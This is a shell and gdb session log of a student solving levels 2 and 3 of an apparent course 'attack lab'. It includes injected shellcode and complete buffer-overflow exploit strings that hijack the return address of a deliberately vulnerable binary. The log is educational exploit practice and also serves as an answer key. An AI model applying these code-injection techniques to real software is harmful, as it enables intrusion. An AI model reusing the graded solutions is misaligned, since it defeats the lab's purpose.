+	result	17:FAIL:0xffffffff:ctarget:2:48 C7 C7 56 DB EB 76 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 A0 61 55 00 00 00 00 8A 18 40 
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) break *0x401859\
+^CQuit
+(gdb) break *0x401859
+Invalid number "0x401859break".
+(gdb) break *0x401859
+Breakpoint 1 at 0x401859: file buf.c, line 16.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x0000000000401859 in getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) x/64bx $rsp
+0x5561a088:	0x48	0xc7	0xc7	0x56	0xdb	0xeb	0x76	0xc3
+0x5561a090:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a098:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b8:	0x88	0xa0	0x61	0x55	0x00	0x00	0x00	0x00
+0x5561a0c0:	0x8a	0x18	0x40	0x00	0x00	0x00	0x00	0x00
+(gdb) break touch2
+Breakpoint 2 at 0x40188a: file visible.c, line 40.
+(gdb) continue
+Continuing.
+
+Breakpoint 2, touch2 (val=4158477888) at visible.c:40
+40	visible.c: No such file or directory.
+(gdb) print $rdi
+$1 = 140737351865920
+(gdb) print/x $rdi
+$2 = 0x7ffff7dd5640
+(gdb) x/8bx $rdi
+0x7ffff7dd5640 <_IO_2_1_stdin_>:	0x88	0x20	0xad	0xfb	0x00	0x00	0x00	0x00
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 11429] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs a.txt
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) disas getbuf
+Dump of assembler code for function getbuf:
+   0x0000000000401848 <+0>:	sub    $0x38,%rsp
+   0x000000000040184c <+4>:	mov    %rsp,%rdi
+   0x000000000040184f <+7>:	callq  0x401a8a <Gets>
+   0x0000000000401854 <+12>:	mov    $0x1,%eax
+   0x0000000000401859 <+17>:	add    $0x38,%rsp
+   0x000000000040185d <+21>:	retq   
+End of assembler dump.
+(gdb) break *0x401854
+Breakpoint 1 at 0x401854: file buf.c, line 16.
+(gdb) run < a.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < a.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) x/s $rsp
+0x5561a088:	"abcd"
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 11726] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs a.txt
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) break touch2
+Breakpoint 1 at 0x40188a: file visible.c, line 40.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, touch2 (val=1995168598) at visible.c:40
+40	visible.c: No such file or directory.
+(gdb) run < ans2.txt
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, touch2 (val=1995168598) at visible.c:40
+40	in visible.c
+(gdb) print $rdi
+$1 = 1995168598
+(gdb) print/x $rdi
+$2 = 0x76ebdb56
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 11841] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ ./ctarget -q < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Touch2!: You called touch2(0x76ebdb56)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:PASS:0xffffffff:ctarget:2:48 C7 C7 56 DB EB 76 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 A0 61 55 00 00 00 00 8A 18 40 
+[huimin@lnxsrv09 ~/target17]$ ./ctarget < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Touch2!: You called touch2(0x76ebdb56)
+Valid solution for level 2 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) disas test
+Dump of assembler code for function test:
+   0x00000000004019c2 <+0>:	sub    $0x8,%rsp
+   0x00000000004019c6 <+4>:	mov    $0x0,%eax
+   0x00000000004019cb <+9>:	callq  0x401848 <getbuf>
+   0x00000000004019d0 <+14>:	mov    %eax,%esi
+   0x00000000004019d2 <+16>:	mov    $0x4030b8,%edi
+   0x00000000004019d7 <+21>:	mov    $0x0,%eax
+   0x00000000004019dc <+26>:	callq  0x400c80 <printf@plt>
+   0x00000000004019e1 <+31>:	add    $0x8,%rsp
+   0x00000000004019e5 <+35>:	retq   
+End of assembler dump.
+(gdb) disas getbuf
+Dump of assembler code for function getbuf:
+   0x0000000000401848 <+0>:	sub    $0x38,%rsp
+   0x000000000040184c <+4>:	mov    %rsp,%rdi
+   0x000000000040184f <+7>:	callq  0x401a8a <Gets>
+   0x0000000000401854 <+12>:	mov    $0x1,%eax
+   0x0000000000401859 <+17>:	add    $0x38,%rsp
+   0x000000000040185d <+21>:	retq   
+End of assembler dump.
+(gdb) break *0x0000000000401854
+Breakpoint 1 at 0x401854: file buf.c, line 16.
+(gdb) run < a.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < a.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) x/s $rsp
+0x5561a088:	"abcd"
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 12097] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) disas touch2
+Dump of assembler code for function touch2:
+   0x000000000040188a <+0>:	sub    $0x8,%rsp
+   0x000000000040188e <+4>:	mov    %edi,%esi
+   0x0000000000401890 <+6>:	movl   $0x2,0x202c62(%rip)        # 0x6044fc <vlevel>
+   0x000000000040189a <+16>:	cmp    0x202c64(%rip),%edi        # 0x604504 <cookie>
+   0x00000000004018a0 <+22>:	jne    0x4018bd <touch2+51>
+   0x00000000004018a2 <+24>:	mov    $0x403018,%edi
+   0x00000000004018a7 <+29>:	mov    $0x0,%eax
+   0x00000000004018ac <+34>:	callq  0x400c80 <printf@plt>
+   0x00000000004018b1 <+39>:	mov    $0x2,%edi
+   0x00000000004018b6 <+44>:	callq  0x401c79 <validate>
+   0x00000000004018bb <+49>:	jmp    0x4018d6 <touch2+76>
+   0x00000000004018bd <+51>:	mov    $0x403040,%edi
+   0x00000000004018c2 <+56>:	mov    $0x0,%eax
+   0x00000000004018c7 <+61>:	callq  0x400c80 <printf@plt>
+   0x00000000004018cc <+66>:	mov    $0x2,%edi
+   0x00000000004018d1 <+71>:	callq  0x401d2b <fail>
+   0x00000000004018d6 <+76>:	mov    $0x0,%edi
+   0x00000000004018db <+81>:	callq  0x400df0 <exit@plt>
+End of assembler dump.
+(gdb) disas touch3
+Dump of assembler code for function touch3:
+   0x000000000040195e <+0>:	push   %rbx
+   0x000000000040195f <+1>:	mov    %rdi,%rbx
+   0x0000000000401962 <+4>:	movl   $0x3,0x202b90(%rip)        # 0x6044fc <vlevel>
+   0x000000000040196c <+14>:	mov    %rdi,%rsi
+   0x000000000040196f <+17>:	mov    0x202b8f(%rip),%edi        # 0x604504 <cookie>
+   0x0000000000401975 <+23>:	callq  0x4018e0 <hexmatch>
+   0x000000000040197a <+28>:	test   %eax,%eax
+   0x000000000040197c <+30>:	je     0x40199c <touch3+62>
+   0x000000000040197e <+32>:	mov    %rbx,%rsi
+   0x0000000000401981 <+35>:	mov    $0x403068,%edi
+   0x0000000000401986 <+40>:	mov    $0x0,%eax
+   0x000000000040198b <+45>:	callq  0x400c80 <printf@plt>
+   0x0000000000401990 <+50>:	mov    $0x3,%edi
+   0x0000000000401995 <+55>:	callq  0x401c79 <validate>
+   0x000000000040199a <+60>:	jmp    0x4019b8 <touch3+90>
+   0x000000000040199c <+62>:	mov    %rbx,%rsi
+   0x000000000040199f <+65>:	mov    $0x403090,%edi
+   0x00000000004019a4 <+70>:	mov    $0x0,%eax
+   0x00000000004019a9 <+75>:	callq  0x400c80 <printf@plt>
+   0x00000000004019ae <+80>:	mov    $0x3,%edi
+   0x00000000004019b3 <+85>:	callq  0x401d2b <fail>
+   0x00000000004019b8 <+90>:	mov    $0x0,%edi
+   0x00000000004019bd <+95>:	callq  0x400df0 <exit@plt>
+End of assembler dump.
+(gdb) quit
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) quit
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) break touch3
+Breakpoint 1 at 0x40195e: file visible.c, line 71.
+(gdb) quit
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) break touch3
+Breakpoint 1 at 0x40195e: file visible.c, line 71.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, touch3 (sval=0x7ffff7dd5640 <_IO_2_1_stdin_> "\210 \255", <incomplete sequence \373>)
+    at visible.c:71
+71	visible.c: No such file or directory.
+(gdb) x/s $rsp
+0x5561a0c8:	"\t"
+(gdb) x/s 0x5561a088
+0x5561a088:	"H\307\307V\333\353", <incomplete sequence \303>
+(gdb) x/64bx 0x5561a088
+0x5561a088:	0x48	0xc7	0xc7	0x56	0xdb	0xeb	0x76	0xc3
+0x5561a090:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a098:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0c0:	0x5e	0x19	0x40	0x00	0x00	0x00	0x00	0x00
+(gdb) disas touch3
+Dump of assembler code for function touch3:
+=> 0x000000000040195e <+0>:	push   %rbx
+   0x000000000040195f <+1>:	mov    %rdi,%rbx
+   0x0000000000401962 <+4>:	movl   $0x3,0x202b90(%rip)        # 0x6044fc <vlevel>
+   0x000000000040196c <+14>:	mov    %rdi,%rsi
+   0x000000000040196f <+17>:	mov    0x202b8f(%rip),%edi        # 0x604504 <cookie>
+   0x0000000000401975 <+23>:	callq  0x4018e0 <hexmatch>
+   0x000000000040197a <+28>:	test   %eax,%eax
+   0x000000000040197c <+30>:	je     0x40199c <touch3+62>
+   0x000000000040197e <+32>:	mov    %rbx,%rsi
+   0x0000000000401981 <+35>:	mov    $0x403068,%edi
+   0x0000000000401986 <+40>:	mov    $0x0,%eax
+   0x000000000040198b <+45>:	callq  0x400c80 <printf@plt>
+   0x0000000000401990 <+50>:	mov    $0x3,%edi
+   0x0000000000401995 <+55>:	callq  0x401c79 <validate>
+   0x000000000040199a <+60>:	jmp    0x4019b8 <touch3+90>
+   0x000000000040199c <+62>:	mov    %rbx,%rsi
+   0x000000000040199f <+65>:	mov    $0x403090,%edi
+   0x00000000004019a4 <+70>:	mov    $0x0,%eax
+   0x00000000004019a9 <+75>:	callq  0x400c80 <printf@plt>
+   0x00000000004019ae <+80>:	mov    $0x3,%edi
+   0x00000000004019b3 <+85>:	callq  0x401d2b <fail>
+   0x00000000004019b8 <+90>:	mov    $0x0,%edi
+   0x00000000004019bd <+95>:	callq  0x400df0 <exit@plt>
+End of assembler dump.
+(gdb) break *0x000000000040197a
+Breakpoint 2 at 0x40197a: file visible.c, line 73.
+(gdb) s
+72	in visible.c
+(gdb) step
+73	in visible.c
+(gdb) continue
+Continuing.
+
+Breakpoint 2, 0x000000000040197a in touch3 (
+    sval=0x7ffff7dd5640 <_IO_2_1_stdin_> "\210 \255", <incomplete sequence \373>) at visible.c:73
+73	in visible.c
+(gdb) x/64bx 0x5561a088
+0x5561a088:	0x48	0xc7	0xc7	0x56	0xdb	0xeb	0x76	0xc3
+0x5561a090:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a098:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a0:	0x40	0x56	0xdd	0xf7	0xff	0x7f	0x00	0x00
+0x5561a0a8:	0xe8	0x5f	0x68	0x55	0x00	0x00	0x00	0x00
+0x5561a0b0:	0x01	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b8:	0x7a	0x19	0x40	0x00	0x00	0x00	0x00	0x00
+0x5561a0c0:	0x00	0x60	0x58	0x55	0x00	0x00	0x00	0x00
+(gdb) x/64bx 0x55685fe8
+0x55685fe8:	0xbd	0x2e	0x40	0x00	0x00	0x00	0x00	0x00
+0x55685ff0:	0xa0	0x1f	0x40	0x00	0x00	0x00	0x00	0x00
+0x55685ff8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55686000:	Cannot access memory at address 0x55686000
+(gdb) print/x "76ebdb56"
+$1 = {0x37, 0x36, 0x65, 0x62, 0x64, 0x62, 0x35, 0x36, 0x0}
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 12493] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs phase2.s
+[huimin@lnxsrv09 ~/target17]$ gcc -c phase2.s
+[huimin@lnxsrv09 ~/target17]$ disas phase2.o
+-bash: disas: command not found
+[huimin@lnxsrv09 ~/target17]$ objdump -d phase2.o
+
+phase2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 88 a0 61 55 	mov    $0x5561a088,%rdi
+   7:	c3                   	retq   
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ ./ctarget -q < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Misfire: You called touch3("? ??")
+FAIL: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:FAIL:0xffffffff:ctarget:3:37 36 65 62 64 62 35 36 00 00 00 00 00 00 00 00 48 C7 C7 88 A0 61 55 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 98 A0 61 55 00 00 00 00 5E 19 40 
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) break *0x401854
+Breakpoint 1 at 0x401854: file buf.c, line 16.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) x/64bx $rsp
+0x5561a088:	0x37	0x36	0x65	0x62	0x64	0x62	0x35	0x36
+0x5561a090:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a098:	0x48	0xc7	0xc7	0x88	0xa0	0x61	0x55	0xc3
+0x5561a0a0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b8:	0x98	0xa0	0x61	0x55	0x00	0x00	0x00	0x00
+0x5561a0c0:	0x5e	0x19	0x40	0x00	0x00	0x00	0x00	0x00
+(gdb) print $rdi
+$1 = 140737351865920
+(gdb) print/x $rdi
+$2 = 0x7ffff7dd5640
+(gdb) step
+touch3 (sval=0x7ffff7dd5640 <_IO_2_1_stdin_> "\210 \255", <incomplete sequence \373>) at visible.c:71
+71	visible.c: No such file or directory.
+(gdb) print/x $rdi
+$3 = 0x7ffff7dd5640
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 13497] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ ./ctarget -q < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Touch3!: You called touch3("76ebdb56")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:PASS:0xffffffff:ctarget:3:37 36 65 62 64 62 35 36 00 00 00 00 00 00 00 00 48 C7 C7 88 A0 61 55 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 98 A0 61 55 00 00 00 00 5E 19 40 
+[huimin@lnxsrv09 ~/target17]$ ./ctarget < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Touch3!: You called touch3("76ebdb56")
+Valid solution for level 3 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ gdb rtarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from rtarget...done.
+(gdb) 
